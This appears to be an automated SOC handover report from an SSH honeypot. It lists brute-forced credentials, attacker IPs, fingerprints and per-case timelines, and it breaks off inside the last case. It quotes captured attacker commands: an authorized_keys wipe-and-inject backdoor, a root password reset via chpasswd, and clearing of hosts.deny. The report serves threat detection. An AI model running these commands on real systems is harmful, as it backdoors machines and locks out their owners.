# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T20:57:55Z |
| **Shift Time** | 20:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **94** |
| Confirmed Threats | **88** |
| False Positives Filtered | **6** (6.4%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **10** |
| High Severity Cases | **22** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **34** |
| Unique Usernames | **18** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `345gs5662d34` | 11 |
| `admin` | 5 |
| `ubuntu` | 4 |
| `teamspeak` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 10 |
| `` | 3 |
| `Admin18` | 2 |
| `aa123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 10 |
| `admin` | `Admin18` | 2 |
| `ubuntu` | `aa123456` | 2 |
| `root` | `Qazwsx111111#` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `78.153.136.3` | 2026-04-23T19:44:01 |
| `root` | `Qazwsx12` | `102.88.137.213` | 2026-04-23T20:04:34 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-04-23T20:04:41 |
| `root` | `Qazwsx111111#` | `106.13.135.26` | 2026-04-23T20:05:53 |
| `root` | `1qaz!QAZ2wsx` | `102.88.137.213` | 2026-04-23T20:06:19 |
| `root` | `qqXX123123` | `102.88.137.213` | 2026-04-23T20:09:00 |
| `root` | `Qazwsx111111#` | `102.88.137.213` | 2026-04-23T20:15:22 |
| `root` | `Root2022@@` | `102.88.137.213` | 2026-04-23T20:19:51 |
| `root` | `Ee123456` | `102.88.137.213` | 2026-04-23T20:21:41 |
| `root` | `Aa112211.` | `102.88.137.213` | 2026-04-23T20:22:36 |
| `root` | `Yy123456@` | `102.88.137.213` | 2026-04-23T20:23:31 |
| `root` | `nPSpP4PBW0` | `102.88.137.213` | 2026-04-23T20:25:17 |
| `root` | `Zxcv@123` | `102.88.137.213` | 2026-04-23T20:27:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **94** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 79 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 74 | 3 |
| `17a5327c6d98...` | Mirai/variant | 2 | 1 |
| `af8223ac9914...` | libssh-based | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 74 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 1 | — |
| `17a5327c6d98...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 2 | 2 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:wvTguXipZZo1"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.13.135.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.88.137.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **14** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 1 | LOW |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS201097` | KVANTA LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (22)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bd8d45435fa3

| Field | Detail |
|---|---|
| **Source IP** | `78.153.136[.]3` |
| **First Seen** | 2026-04-23 19:44 |
| **Last Seen** | 2026-04-23 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 19:44:01` | `cowrie.session.connect` |
| `2026-04-23 19:44:01` | `cowrie.login.success` |
| `2026-04-23 19:44:01` | `cowrie.session.params` |
| `2026-04-23 19:44:01` | `cowrie.log.closed` |
| `2026-04-23 19:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.153.136[.]3` to AbuseIPDB if not already reported
- [ ] Block `78.153.136[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f269afc657e0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:04 |
| **Last Seen** | 2026-04-23 20:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:04:33` | `cowrie.session.connect` |
| `2026-04-23 20:04:33` | `cowrie.client.version` |
| `2026-04-23 20:04:33` | `cowrie.client.kex` |
| `2026-04-23 20:04:34` | `cowrie.login.success` |
| `2026-04-23 20:04:35` | `cowrie.session.params` |
| `2026-04-23 20:04:35` | `cowrie.command.input` |
| `2026-04-23 20:04:35` | `cowrie.command.failed` |
| `2026-04-23 20:04:35` | `cowrie.log.closed` |
| `2026-04-23 20:04:36` | `cowrie.session.params` |
| `2026-04-23 20:04:36` | `cowrie.command.input` |
| `2026-04-23 20:04:36` | `cowrie.session.file_download` |
| `2026-04-23 20:04:36` | `cowrie.log.closed` |
| `2026-04-23 20:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7767c38567

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:04 |
| **Last Seen** | 2026-04-23 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:04:39` | `cowrie.session.connect` |
| `2026-04-23 20:04:39` | `cowrie.client.version` |
| `2026-04-23 20:04:40` | `cowrie.client.kex` |
| `2026-04-23 20:04:41` | `cowrie.login.success` |
| `2026-04-23 20:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56169d6d993

| Field | Detail |
|---|---|
| **Source IP** | `106.13.135[.]26` |
| **First Seen** | 2026-04-23 20:05 |
| **Last Seen** | 2026-04-23 20:06 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wvTguXipZZo1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:05:50` | `cowrie.session.connect` |
| `2026-04-23 20:05:50` | `cowrie.client.version` |
| `2026-04-23 20:05:50` | `cowrie.client.kex` |
| `2026-04-23 20:05:53` | `cowrie.login.success` |
| `2026-04-23 20:05:53` | `cowrie.session.params` |
| `2026-04-23 20:05:53` | `cowrie.command.input` |
| `2026-04-23 20:05:53` | `cowrie.command.failed` |
| `2026-04-23 20:05:53` | `cowrie.log.closed` |
| `2026-04-23 20:05:54` | `cowrie.session.params` |
| `2026-04-23 20:05:54` | `cowrie.command.input` |
| `2026-04-23 20:05:55` | `cowrie.session.file_download` |
| `2026-04-23 20:05:55` | `cowrie.log.closed` |
| `2026-04-23 20:06:04` | `cowrie.session.params` |
| `2026-04-23 20:06:04` | `cowrie.command.input` |
| `2026-04-23 20:06:04` | `cowrie.log.closed` |
| `2026-04-23 20:06:07` | `cowrie.session.params` |
| `2026-04-23 20:06:07` | `cowrie.command.input` |
| `2026-04-23 20:06:08` | `cowrie.log.closed` |
| `2026-04-23 20:06:08` | `cowrie.session.params` |
| `2026-04-23 20:06:08` | `cowrie.command.input` |
| `2026-04-23 20:06:09` | `cowrie.session.file_download` |
| `2026-04-23 20:06:09` | `cowrie.log.closed` |
| `2026-04-23 20:06:09` | `cowrie.session.params` |
| `2026-04-23 20:06:09` | `cowrie.command.input` |
| `2026-04-23 20:06:09` | `cowrie.log.closed` |
| `2026-04-23 20:06:11` | `cowrie.session.params` |
| `2026-04-23 20:06:11` | `cowrie.command.input` |
| `2026-04-23 20:06:11` | `cowrie.log.closed` |
| `2026-04-23 20:06:12` | `cowrie.session.params` |
| `2026-04-23 20:06:12` | `cowrie.command.input` |
| `2026-04-23 20:06:12` | `cowrie.command.input` |
| `2026-04-23 20:06:13` | `cowrie.log.closed` |
| `2026-04-23 20:06:13` | `cowrie.session.params` |
| `2026-04-23 20:06:13` | `cowrie.command.input` |
| `2026-04-23 20:06:14` | `cowrie.log.closed` |
| `2026-04-23 20:06:15` | `cowrie.session.params` |
| `2026-04-23 20:06:15` | `cowrie.command.input` |
| `2026-04-23 20:06:15` | `cowrie.log.closed` |
| `2026-04-23 20:06:16` | `cowrie.session.params` |
| `2026-04-23 20:06:16` | `cowrie.command.input` |
| `2026-04-23 20:06:16` | `cowrie.log.closed` |
| `2026-04-23 20:06:17` | `cowrie.session.params` |
| `2026-04-23 20:06:17` | `cowrie.command.input` |
| `2026-04-23 20:06:17` | `cowrie.log.closed` |
| `2026-04-23 20:06:18` | `cowrie.session.params` |
| `2026-04-23 20:06:18` | `cowrie.command.input` |
| `2026-04-23 20:06:19` | `cowrie.log.closed` |
| `2026-04-23 20:06:20` | `cowrie.session.params` |
| `2026-04-23 20:06:20` | `cowrie.command.input` |
| `2026-04-23 20:06:20` | `cowrie.log.closed` |
| `2026-04-23 20:06:21` | `cowrie.session.params` |
| `2026-04-23 20:06:21` | `cowrie.command.input` |
| `2026-04-23 20:06:21` | `cowrie.log.closed` |
| `2026-04-23 20:06:24` | `cowrie.session.params` |
| `2026-04-23 20:06:24` | `cowrie.command.input` |
| `2026-04-23 20:06:24` | `cowrie.log.closed` |
| `2026-04-23 20:06:25` | `cowrie.session.params` |
| `2026-04-23 20:06:25` | `cowrie.command.input` |
| `2026-04-23 20:06:25` | `cowrie.log.closed` |
| `2026-04-23 20:06:25` | `cowrie.session.params` |
| `2026-04-23 20:06:25` | `cowrie.command.input` |
| `2026-04-23 20:06:26` | `cowrie.log.closed` |
| `2026-04-23 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.135[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.13.135[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5b31da0011

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:06 |
| **Last Seen** | 2026-04-23 20:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:06:18` | `cowrie.session.connect` |
| `2026-04-23 20:06:18` | `cowrie.client.version` |
| `2026-04-23 20:06:18` | `cowrie.client.kex` |
| `2026-04-23 20:06:19` | `cowrie.login.success` |
| `2026-04-23 20:06:20` | `cowrie.session.params` |
| `2026-04-23 20:06:20` | `cowrie.command.input` |
| `2026-04-23 20:06:20` | `cowrie.command.failed` |
| `2026-04-23 20:06:20` | `cowrie.log.closed` |
| `2026-04-23 20:06:21` | `cowrie.session.params` |
| `2026-04-23 20:06:21` | `cowrie.command.input` |
| `2026-04-23 20:06:21` | `cowrie.session.file_download` |
| `2026-04-23 20:06:21` | `cowrie.log.closed` |
| `2026-04-23 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d996b997317

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:06 |
| **Last Seen** | 2026-04-23 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:06:24` | `cowrie.session.connect` |
| `2026-04-23 20:06:24` | `cowrie.client.version` |
| `2026-04-23 20:06:25` | `cowrie.client.kex` |
| `2026-04-23 20:06:26` | `cowrie.login.success` |
| `2026-04-23 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba589be5e91

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:08 |
| **Last Seen** | 2026-04-23 20:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:08:58` | `cowrie.session.connect` |
| `2026-04-23 20:08:58` | `cowrie.client.version` |
| `2026-04-23 20:08:59` | `cowrie.client.kex` |
| `2026-04-23 20:09:00` | `cowrie.login.success` |
| `2026-04-23 20:09:01` | `cowrie.session.params` |
| `2026-04-23 20:09:01` | `cowrie.command.input` |
| `2026-04-23 20:09:01` | `cowrie.command.failed` |
| `2026-04-23 20:09:01` | `cowrie.log.closed` |
| `2026-04-23 20:09:01` | `cowrie.session.params` |
| `2026-04-23 20:09:01` | `cowrie.command.input` |
| `2026-04-23 20:09:02` | `cowrie.session.file_download` |
| `2026-04-23 20:09:02` | `cowrie.log.closed` |
| `2026-04-23 20:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929cf979ba6a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:09 |
| **Last Seen** | 2026-04-23 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:09:05` | `cowrie.session.connect` |
| `2026-04-23 20:09:05` | `cowrie.client.version` |
| `2026-04-23 20:09:05` | `cowrie.client.kex` |
| `2026-04-23 20:09:07` | `cowrie.login.success` |
| `2026-04-23 20:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca32dd21bb40

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:15 |
| **Last Seen** | 2026-04-23 20:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:15:20` | `cowrie.session.connect` |
| `2026-04-23 20:15:20` | `cowrie.client.version` |
| `2026-04-23 20:15:20` | `cowrie.client.kex` |
| `2026-04-23 20:15:22` | `cowrie.login.success` |
| `2026-04-23 20:15:22` | `cowrie.session.params` |
| `2026-04-23 20:15:22` | `cowrie.command.input` |
| `2026-04-23 20:15:22` | `cowrie.command.failed` |
| `2026-04-23 20:15:23` | `cowrie.log.closed` |
| `2026-04-23 20:15:23` | `cowrie.session.params` |
| `2026-04-23 20:15:23` | `cowrie.command.input` |
| `2026-04-23 20:15:23` | `cowrie.session.file_download` |
| `2026-04-23 20:15:23` | `cowrie.log.closed` |
| `2026-04-23 20:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f344d9d1fd

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:15 |
| **Last Seen** | 2026-04-23 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 20:15:27` | `cowrie.session.connect` |
| `2026-04-23 20:15:27` | `cowrie.client.version` |
| `2026-04-23 20:15:27` | `cowrie.client.kex` |
| `2026-04-23 20:15:28` | `cowrie.login.success` |
| `2026-04-23 20:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c2d91a136a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-23 20:19 |
| **Last Seen** | 2026-04-23 20:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
